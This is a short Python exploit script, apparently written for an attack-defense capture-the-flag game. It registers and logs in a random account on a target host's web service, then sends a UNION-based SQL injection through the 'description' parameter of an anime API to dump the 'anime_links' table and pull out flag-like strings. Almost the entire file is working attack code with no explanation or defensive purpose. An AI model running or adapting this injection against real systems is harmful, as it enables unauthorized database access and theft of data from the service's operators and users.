#!/usr/bin/env python
# -*- coding: utf-8 -*-
from storage import storage_set, storage_get
import sys, re, requests
import string, random, uuid, re, json

ip = sys.argv[1]


s = requests.Session()

def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

username = generator()
password = generator()

auth = {"name":username,"password":password}
html = s.post('http://{}:8000/api/auth/register'.format(ip),json=auth,timeout=(None,None))
html = s.post('http://{}:8000/api/auth/login'.format(ip),json=auth,timeout=(None,None))

html = s.get('http://{}:8000/api/db/anime?description=1%27+UNION+ALL+SELECT+NULL,content,NULL,NULL,NULL,NULL,NULL,NULL+FROM+anime_links+--+-'.format(ip),timeout=(None,None))

print(re.findall('[A-Z0-9]{31}=', html.text),flush=True)


#users = json.loads(s.get('http://{}:8000/api/chat/users/'.format(ip)).text)

#for user in users['result']:
#    print(user)
#    break